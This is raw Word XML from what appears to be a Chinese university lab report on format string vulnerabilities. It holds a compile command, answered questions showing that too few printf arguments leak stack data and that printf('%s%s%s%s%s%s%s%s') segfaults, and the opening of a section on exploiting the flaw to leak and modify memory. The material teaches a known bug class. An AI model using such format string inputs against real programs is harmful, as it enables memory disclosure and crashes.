                              <w:t>args_lack.c</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> -o </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                              <w:t>args_lack</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                          </w:p>
                          <w:p w14:paraId="64474230" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                            <w:pPr>
                              <w:wordWrap w:val="0"/>
                              <w:spacing w:before="75"/>
                              <w:ind w:left="103"/>
                              <w:jc w:val="left"/>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                            </w:pPr>
                          </w:p>
                          <w:p w14:paraId="1CC31457" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                            <w:pPr>
                              <w:wordWrap w:val="0"/>
                              <w:spacing w:before="75"/>
                              <w:jc w:val="left"/>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                            </w:pPr>
                          </w:p>
                          <w:p w14:paraId="02F00C79" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                            <w:pPr>
                              <w:wordWrap w:val="0"/>
                              <w:spacing w:before="75"/>
                              <w:ind w:left="103"/>
                              <w:jc w:val="left"/>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                            </w:pPr>
                          </w:p>
                          <w:p w14:paraId="4E1B40A5" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A"/>
                        </w:txbxContent>
                      </wps:txbx>
                      <wps:bodyPr lIns="0" tIns="0" rIns="0" bIns="0" upright="1"/>
                    </wps:wsp>
                  </a:graphicData>
                </a:graphic>
              </wp:anchor>
            </w:drawing>
          </mc:Choice>
          <mc:Fallback>
            <w:pict>
              <v:shape w14:anchorId="1E9EE525" id="文本框 35" o:spid="_x0000_s1028" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:114.5pt;margin-top:1.1pt;width:392.9pt;height:39.5pt;z-index:-2516531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" filled="f" strokeweight=".16969mm">
                <v:textbox inset="0,0,0,0">
                  <w:txbxContent>
                    <w:p w14:paraId="26FD7391" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
                      <w:pPr>
                        <w:spacing w:before="75"/>
                        <w:ind w:left="102"/>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w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                        <w:t>args_lack.c</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                        <w:t xml:space="preserve"> -o </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                        <w:t>args_lack</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                    </w:p>
                    <w:p w14:paraId="64474230" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                      <w:pPr>
                        <w:wordWrap w:val="0"/>
                        <w:spacing w:before="75"/>
                        <w:ind w:left="103"/>
                        <w:jc w:val="left"/>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                    <w:p w14:paraId="1CC31457" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                      <w:pPr>
                        <w:wordWrap w:val="0"/>
                        <w:spacing w:before="75"/>
                        <w:jc w:val="left"/>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                    <w:p w14:paraId="02F00C79" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                      <w:pPr>
                        <w:wordWrap w:val="0"/>
                        <w:spacing w:before="75"/>
                        <w:ind w:left="103"/>
                        <w:jc w:val="left"/>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                    <w:p w14:paraId="4E1B40A5" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A"/>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="topAndBottom" anchorx="page"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>参考运行结果</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="068BC6C0" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="420"/>
        <w:rPr>
          <w:ins w:id="9" w:author="zhao ruizhi" w:date="2023-05-07T17:36:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5BAD6B67" wp14:editId="26FE43E8">
            <wp:extent cx="4667250" cy="552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667250" cy="552450"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B545ED6" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="10" w:author="zhao ruizhi" w:date="2023-05-07T17:36:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:noProof/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:drawing>
            <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="037FEDEE" wp14:editId="5DD78459">
              <wp:extent cx="5274310" cy="1508760"/>
              <wp:effectExtent l="0" t="0" r="2540" b="0"/>
              <wp:docPr id="11402206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0692" name="图片 1"/>
                      <pic:cNvPicPr>
                        <a:picLocks noChangeAspect="1"/>
                      </pic:cNvPicPr>
                    </pic:nvPicPr>
                    <pic:blipFill>
                      <a:blip r:embed="rId10"/>
                      <a:stretch>
                        <a:fillRect/>
                      </a:stretch>
                    </pic:blipFill>
                    <pic:spPr>
                      <a:xfrm>
                        <a:off x="0" y="0"/>
                        <a:ext cx="5274310" cy="1508760"/>
                      </a:xfrm>
                      <a:prstGeom prst="rect">
                        <a:avLst/>
                      </a:prstGeom>
                    </pic:spPr>
                  </pic:pic>
                </a:graphicData>
              </a:graphic>
            </wp:inline>
          </w:drawing>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2EC6FC3A"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思考题</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:hint="eastAsia"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>本步骤作为实验开放性考核的一部分，必须整理进实验报告</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22C717A9" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="11" w:author="zhao ruizhi" w:date="2023-05-07T17:48:00Z"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>当可变参数不足时，输出会存在什么问题，以</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>.4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>中运行结果为例，请解释程序的输出。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AE37906" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="840" w:firstLine="0"/>
        <w:rPr>
          <w:ins w:id="12" w:author="zhao ruizhi" w:date="2023-05-07T17:48:00Z"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="13" w:author="zhao ruizhi" w:date="2023-05-07T17:48:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>答：</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="13A6B1BA" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000" w:rsidP="00193C1A">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="840" w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:pPrChange w:id="14" w:author="zhao ruizhi" w:date="2023-05-07T17:48:00Z">
          <w:pPr>
            <w:pStyle w:val="af2"/>
            <w:numPr>
              <w:numId w:val="4"/>
            </w:numPr>
            <w:spacing w:line="360" w:lineRule="auto"/>
            <w:ind w:left="840" w:hanging="360"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:ins w:id="15" w:author="zhao ruizhi" w:date="2023-05-07T17:48:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>当可变参数不足时，格式化字符串会尝试读取</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>栈</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>上的数据，这</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>会</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>导致将</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>栈</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>上的敏感信息泄漏给攻击者。</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7CFCD82D" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="16" w:author="zhao ruizhi" w:date="2023-05-07T17:50:00Z"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>如果执行类似这样的代码</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>printf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>("%</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>s%s%s%s%s%s%s%s</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>");</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>可能</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>会出现什么问题。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AFE2B9D" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="840" w:firstLine="0"/>
        <w:rPr>
          <w:ins w:id="17" w:author="zhao ruizhi" w:date="2023-05-07T17:51:00Z"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="18" w:author="zhao ruizhi" w:date="2023-05-07T17:51:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>答：</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="53DBE3DA" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="840" w:firstLine="0"/>
        <w:rPr>
          <w:ins w:id="19" w:author="zhao ruizhi" w:date="2023-05-07T17:54:00Z"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="20" w:author="zhao ruizhi" w:date="2023-05-07T17:54:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:drawing>
            <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2FFD2FB6" wp14:editId="1F1C29BE">
              <wp:extent cx="5274310" cy="1812925"/>
              <wp:effectExtent l="0" t="0" r="2540" b="0"/>
              <wp:docPr id="18527376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37665" name="图片 1"/>
                      <pic:cNvPicPr>
                        <a:picLocks noChangeAspect="1"/>
                      </pic:cNvPicPr>
                    </pic:nvPicPr>
                    <pic:blipFill>
                      <a:blip r:embed="rId11"/>
                      <a:stretch>
                        <a:fillRect/>
                      </a:stretch>
                    </pic:blipFill>
                    <pic:spPr>
                      <a:xfrm>
                        <a:off x="0" y="0"/>
                        <a:ext cx="5274310" cy="1812925"/>
                      </a:xfrm>
                      <a:prstGeom prst="rect">
                        <a:avLst/>
                      </a:prstGeom>
                    </pic:spPr>
                  </pic:pic>
                </a:graphicData>
              </a:graphic>
            </wp:inline>
          </w:drawing>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="35C0F66A" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="840" w:firstLine="0"/>
        <w:rPr>
          <w:ins w:id="21" w:author="zhao ruizhi" w:date="2023-05-07T17:57:00Z"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="22" w:author="zhao ruizhi" w:date="2023-05-07T17:56:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:drawing>
            <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="167A2296" wp14:editId="668D8FAF">
              <wp:extent cx="5274310" cy="1564005"/>
              <wp:effectExtent l="0" t="0" r="2540" b="0"/>
              <wp:docPr id="1062884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84742" name="图片 1"/>
                      <pic:cNvPicPr>
                        <a:picLocks noChangeAspect="1"/>
                      </pic:cNvPicPr>
                    </pic:nvPicPr>
                    <pic:blipFill>
                      <a:blip r:embed="rId12"/>
                      <a:stretch>
                        <a:fillRect/>
                      </a:stretch>
                    </pic:blipFill>
                    <pic:spPr>
                      <a:xfrm>
                        <a:off x="0" y="0"/>
                        <a:ext cx="5274310" cy="1564005"/>
                      </a:xfrm>
                      <a:prstGeom prst="rect">
                        <a:avLst/>
                      </a:prstGeom>
                    </pic:spPr>
                  </pic:pic>
                </a:graphicData>
              </a:graphic>
            </wp:inline>
          </w:drawing>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="46BA20A4" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRPr="00193C1A" w:rsidRDefault="00000000" w:rsidP="00193C1A">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="840" w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
          <w:rPrChange w:id="23" w:author="zhao ruizhi" w:date="2023-05-07T17:57:00Z">
            <w:rPr>
              <w:lang w:eastAsia="zh-CN"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:pPrChange w:id="24" w:author="zhao ruizhi" w:date="2023-05-07T17:57:00Z">
          <w:pPr>
            <w:pStyle w:val="af2"/>
            <w:numPr>
              <w:numId w:val="4"/>
            </w:numPr>
            <w:spacing w:line="360" w:lineRule="auto"/>
            <w:ind w:left="840" w:hanging="360"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:ins w:id="25" w:author="zhao ruizhi" w:date="2023-05-07T17:57:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>如图，出现段错误。</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6D830F23" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:del w:id="26" w:author="zhao ruizhi" w:date="2023-05-07T17:50:00Z"/>
          <w:rFonts w:ascii="黑体" w:eastAsia="黑体"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="57E8B091" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:del w:id="27" w:author="zhao ruizhi" w:date="2023-05-07T17:50:00Z"/>
          <w:rFonts w:ascii="黑体" w:eastAsia="黑体"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="14CA9873" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:del w:id="28" w:author="zhao ruizhi" w:date="2023-05-07T17:50:00Z"/>
          <w:rFonts w:ascii="黑体" w:eastAsia="黑体"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3B472B3A" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:del w:id="29" w:author="zhao ruizhi" w:date="2023-05-07T17:50:00Z"/>
          <w:rFonts w:ascii="黑体" w:eastAsia="黑体"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3452136F" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:del w:id="30" w:author="zhao ruizhi" w:date="2023-05-07T17:50:00Z"/>
          <w:rFonts w:ascii="黑体" w:eastAsia="黑体"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4BC0481D" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A" w:rsidP="00193C1A">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:eastAsia="黑体"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:pPrChange w:id="31" w:author="zhao ruizhi" w:date="2023-05-07T17:50:00Z">
          <w:pPr>
            <w:spacing w:line="360" w:lineRule="auto"/>
            <w:jc w:val="center"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2A9B629E" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:eastAsia="黑体"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:eastAsia="黑体" w:hint="eastAsia"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>利用格式化字符串漏洞</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26231853"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实验内容</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B68E239" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="宋体"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="宋体" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>通过字符串格式化漏洞，泄露</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="宋体" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>栈</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="宋体" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>中数据，并修改内存中数据。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71BB75C7"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实验指导</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FA241AA"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宋体" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:bidi="en-US"/>
        </w:rPr>
        <w:t>要想发起一次成功的攻击，要弄清楚</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函数在运行时的</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>栈</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
